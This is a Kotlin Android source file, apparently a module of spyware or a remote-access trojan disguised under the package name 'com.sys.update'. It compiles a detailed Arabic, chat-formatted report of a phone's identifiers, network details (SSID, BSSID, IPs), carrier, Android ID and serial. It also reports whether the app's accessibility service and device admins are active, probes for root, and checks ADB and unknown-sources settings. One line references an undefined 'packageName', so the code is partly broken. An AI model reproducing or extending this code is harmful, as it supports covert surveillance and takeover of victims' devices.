package com.sys.update

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.hardware.Sensor
import android.hardware.SensorManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.Settings
import android.telephony.TelephonyManager
import android.text.format.Formatter
import android.util.DisplayMetrics
import android.view.WindowManager
import java.net.InetAddress
import java.net.NetworkInterface
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

object DeviceInfo {

    fun getFullInfo(ctx: Context): String {
        val sb = StringBuilder()
        sb.append("📱 *معلومات الجهاز الشاملة*\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

        // ═══════════ DEVICE ═══════════
        sb.append("🔷 *الجهاز*\n")
        sb.append("🏭 الشركة: `${Build.MANUFACTURER}`\n")
        sb.append("📱 الموديل: `${Build.MODEL}`\n")
        sb.append("📦 المنتج: `${Build.PRODUCT}`\n")
        sb.append("🔧 الجهاز: `${Build.DEVICE}`\n")
        sb.append("🎯 اللوحة: `${Build.BOARD}`\n")
        sb.append("🖥 العتاد: `${Build.HARDWARE}`\n")
        sb.append("👤 المستخدم: `${Build.USER}`\n")
        sb.append("🏷 العلامة: `${Build.BRAND}`\n\n")

        // ═══════════ ANDROID ═══════════
        sb.append("🤖 *Android*\n")
        sb.append("📌 الإصدار: `${Build.VERSION.RELEASE}`\n")
        sb.append("🔢 API: `${Build.VERSION.SDK_INT}`\n")
        sb.append("🔨 الـ Build: `${Build.ID}`\n")
        sb.append("📅 البناء: `${Build.TIME.let { SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(Date(it)) }}`\n")
        sb.append("🔐 تصحيح الأمان: `${Build.VERSION.SECURITY_PATCH}`\n")
        sb.append("📻 النطاق الأساسي: `${Build.getRadioVersion() ?: "unknown"}`\n\n")

        // ═══════════ CPU ═══════════
        sb.append("🧠 *المعالج*\n")
        sb.append("🔩 ABI: `${Build.SUPPORTED_ABIS.joinToString()}`\n")
        sb.append("⚙ الأنوية: `${Runtime.getRuntime().availableProcessors()}`\n")
        sb.append("📊 التردد: `${getCpuMaxFreq()}`\n\n")

        // ═══════════ RAM ═══════════
        try {
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val mi = ActivityManager.MemoryInfo()
            am.getMemoryInfo(mi)
            val totalMB = mi.totalMem / (1024 * 1024)
            val availMB = mi.availMem / (1024 * 1024)
            val usedMB = totalMB - availMB
            sb.append("💠 *RAM*\n")
            sb.append("📊 الكلي: `$totalMB MB`\n")
            sb.append("✅ المتاح: `$availMB MB`\n")
            sb.append("🔴 المستخدم: `$usedMB MB`\n")
            sb.append("⚠️ منخفض: `${if (mi.lowMemory) "نعم" else "لا"}`\n\n")
        } catch (_: Exception) {}

        // ═══════════ STORAGE ═══════════
        try {
            sb.append("💾 *التخزين*\n")
            sb.append("📂 Internal:\n")
            val internal = StatFs(Environment.getDataDirectory().path)
            val iTotal = internal.blockCountLong * internal.blockSizeLong / (1024L * 1024 * 1024)
            val iFree = internal.availableBlocksLong * internal.blockSizeLong / (1024L * 1024 * 1024)
            sb.append("   • الكلي: `${iTotal} GB`\n")
            sb.append("   • المتاح: `${iFree} GB`\n")

            if (Environment.getExternalStorageState() == Environment.MEDIA_MOUNTED) {
                val ext = StatFs(Environment.getExternalStorageDirectory().path)
                val eTotal = ext.blockCountLong * ext.blockSizeLong / (1024L * 1024 * 1024)
                val eFree = ext.availableBlocksLong * ext.blockSizeLong / (1024L * 1024 * 1024)
                sb.append("📂 External:\n")
                sb.append("   • الكلي: `${eTotal} GB`\n")
                sb.append("   • المتاح: `${eFree} GB`\n")
            }
            sb.append("\n")
        } catch (_: Exception) {}

        // ═══════════ BATTERY ═══════════
        try {
            val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val intent = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val statusStr = when (status) {
                BatteryManager.BATTERY_STATUS_CHARGING -> "🔌 يشحن"
                BatteryManager.BATTERY_STATUS_DISCHARGING -> "🔋 يفرغ"
                BatteryManager.BATTERY_STATUS_FULL -> "✅ ممتلئ"
                BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "⏸ لا يشحن"
                else -> "❓ غير معروف"
            }
            val temp = (intent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0
            val voltage = intent?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0) ?: 0
            val health = intent?.getIntExtra(BatteryManager.EXTRA_HEALTH, -1) ?: -1
            val healthStr = when (health) {
                BatteryManager.BATTERY_HEALTH_GOOD -> "جيدة"
                BatteryManager.BATTERY_HEALTH_OVERHEAT -> "حرارة مرتفعة"
                BatteryManager.BATTERY_HEALTH_DEAD -> "تالفة"
                BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "جهد مرتفع"
                else -> "غير معروفة"
            }

            sb.append("🔋 *البطارية*\n")
            sb.append("📊 النسبة: `$level%`\n")
            sb.append("🔌 الحالة: `$statusStr`\n")
            sb.append("🌡 الحرارة: `${temp}°C`\n")
            sb.append("⚡ الجهد: `${voltage} mV`\n")
            sb.append("❤ الصحة: `$healthStr`\n\n")
        } catch (_: Exception) {}

        // ═══════════ SCREEN ═══════════
        try {
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(metrics)
            sb.append("🖥 *الشاشة*\n")
            sb.append("📐 الدقة: `${metrics.widthPixels} x ${metrics.heightPixels}`\n")
            sb.append("📏 الكثافة: `${metrics.densityDpi} dpi`\n")
            sb.append("🎨 الألوان: `${metrics.density}`\n\n")
        } catch (_: Exception) {}

        // ═══════════ NETWORK ═══════════
        sb.append("🌐 *الشبكة*\n")
        try {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val net = cm.activeNetwork
            val caps = cm.getNetworkCapabilities(net)
            val type = when {
                caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "Wi-Fi"
                caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "بيانات الجوال"
                caps?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == true -> "VPN"
                caps?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
                else -> "غير معروف"
            }
            sb.append("📶 النوع: `$type`\n")

            val wifi = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            @Suppress("DEPRECATION")
            val info = wifi.connectionInfo
            if (info != null) {
                @Suppress("DEPRECATION")
                val ssid = info.ssid?.replace("\"", "") ?: ""
                @Suppress("DEPRECATION")
                val bssid = info.bssid ?: ""
                @Suppress("DEPRECATION")
                val ip = info.ipAddress
                if (ssid.isNotBlank() && ssid != "<unknown ssid>") sb.append("🛜 SSID: `$ssid`\n")
                if (bssid.isNotBlank()) sb.append("📡 BSSID: `$bssid`\n")
                if (ip != 0) sb.append("💻 Wi-Fi IP: `${intToIp(ip)}`\n")
            }
        } catch (_: Exception) {}

        // Local IP addresses
        try {
            val ips = mutableListOf<String>()
            NetworkInterface.getNetworkInterfaces()?.toList()?.forEach { ni ->
                ni.inetAddresses?.toList()?.forEach { addr ->
                    if (!addr.isLoopbackAddress && addr.hostAddress?.contains(":") == false) {
                        ips.add("${ni.name}: ${addr.hostAddress}")
                    }
                }
            }
            if (ips.isNotEmpty()) {
                sb.append("🔗 IPs المحلية:\n")
                ips.take(4).forEach { sb.append("   • `$it`\n") }
            }
        } catch (_: Exception) {}

        // Carrier
        try {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            @Suppress("DEPRECATION")
            val carrier = tm.networkOperatorName ?: ""
            if (carrier.isNotBlank()) sb.append("📞 المشغّل: `$carrier`\n")
            @Suppress("DEPRECATION")
            val country = tm.networkCountryIso ?: ""
            if (country.isNotBlank()) sb.append("🌍 الدولة: `$country`\n")
        } catch (_: Exception) {}
        sb.append("\n")

        // ═══════════ IDENTITY ═══════════
        sb.append("🆔 *المعرّفات*\n")
        try {
            val androidId = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
            sb.append("🆔 Android ID: `$androidId`\n")
        } catch (_: Exception) {}

        try {
            val serial = if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
                @Suppress("DEPRECATION")
                Build.SERIAL
            } else "غير متاح"
            sb.append("🔑 Serial: `$serial`\n")
        } catch (_: Exception) {}

        sb.append("🔢 Fingerprint:\n`${Build.FINGERPRINT}`\n\n")

        // ═══════════ LOCALE / TIME ═══════════
        sb.append("🌍 *المنطقة والوقت*\n")
        sb.append("🗣 اللغة: `${Locale.getDefault().language}`\n")
        sb.append("🌐 البلد: `${Locale.getDefault().country}`\n")
        sb.append("🕐 المنطقة الزمنية: `${TimeZone.getDefault().id}`\n")
        sb.append("⏰ الوقت الحالي: `${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())}`\n")
        sb.append("⏱ Uptime: `${android.os.SystemClock.elapsedRealtime() / 1000 / 60} دقيقة`\n\n")

        // ═══════════ SECURITY ═══════════
        sb.append("🔐 *الحماية*\n")
        try {
            val settings = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
            sb.append("♿ Accessibility: `${if (settings.contains(packageName)) "التطبيق مفعّل" else "غير مفعّل"}`\n")

            val admins = getDeviceAdmins(ctx)
            sb.append("👮 Admins: `$admins`\n")

            val root = isRooted()
            sb.append("🔓 Root: `${if (root) "نعم ⚠" else "لا"}`\n")

            val debug = Settings.Global.getInt(ctx.contentResolver, Settings.Global.ADB_ENABLED, 0) == 1
            sb.append("🐞 ADB: `${if (debug) "مفعّل" else "معطّل"}`\n")

            val unknownSources = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.packageManager.canRequestPackageInstalls()
            } else true
            sb.append("📦 مصادر خارجية: `${if (unknownSources) "مسموحة" else "ممنوعة"}`\n")
        } catch (_: Exception) {}
        sb.append("\n")

        // ═══════════ APP INFO ═══════════
        try {
            val pi = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
            sb.append("📱 *التطبيق*\n")
            sb.append("📛 الاسم: `${pi.applicationInfo?.loadLabel(ctx.packageManager)}`\n")
            sb.append("📦 الحزمة: `${pi.packageName}`\n")
            sb.append("🔖 الإصدار: `${pi.versionName} (${pi.versionCode})`\n")
            sb.append("📅 التثبيت: `${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(Date(pi.firstInstallTime))}`\n")
            sb.append("📅 التحديث: `${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(Date(pi.lastUpdateTime))}`\n\n")
        } catch (_: Exception) {}

        // ═══════════ SENSORS ═══════════
        try {
            val sm = ctx.getSystemService(Context.SENSOR_SERVICE) as SensorManager
            val list = sm.getSensorList(Sensor.TYPE_ALL)
            sb.append("🎛 *الحساسات* (${list.size})\n")
            list.take(15).forEach { s ->
                sb.append("   • ${s.name}\n")
            }
            if (list.size > 15) sb.append("   … +${list.size - 15}\n")
        } catch (_: Exception) {}

        return sb.toString()
    }

    fun getQuickInfo(ctx: Context): String {
        return "${Build.MANUFACTURER} ${Build.MODEL} — Android ${Build.VERSION.RELEASE}"
    }

    private fun intToIp(ip: Int): String =
        "${ip and 0xff}.${ip shr 8 and 0xff}.${ip shr 16 and 0xff}.${ip shr 24 and 0xff}"

    private fun getCpuMaxFreq(): String {
        return try {
            val files = listOf(
                "/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq",
                "/sys/devices/system/cpu/cpu0/cpufreq/scaling_max_freq"
            )
            for (f in files) {
                val file = java.io.File(f)
                if (file.exists()) {
                    val khz = file.readText().trim().toLongOrNull() ?: continue
                    return "${khz / 1000 / 1000}.${(khz / 100000) % 10} GHz"
                }
            }
            "غير معروف"
        } catch (_: Exception) { "غير معروف" }
    }

    private fun getDeviceAdmins(ctx: Context): String {
        return try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val admins = dpm.activeAdmins ?: emptyList()
            if (admins.isEmpty()) "لا يوجد"
            else admins.joinToString(", ") { it.flattenToShortString() }
        } catch (_: Exception) { "غير معروف" }
    }

    private fun isRooted(): Boolean {
        val paths = arrayOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/su/bin/su"
        )
        return paths.any { try { java.io.File(it).exists() } catch (_: Exception) { false } }
    }
}
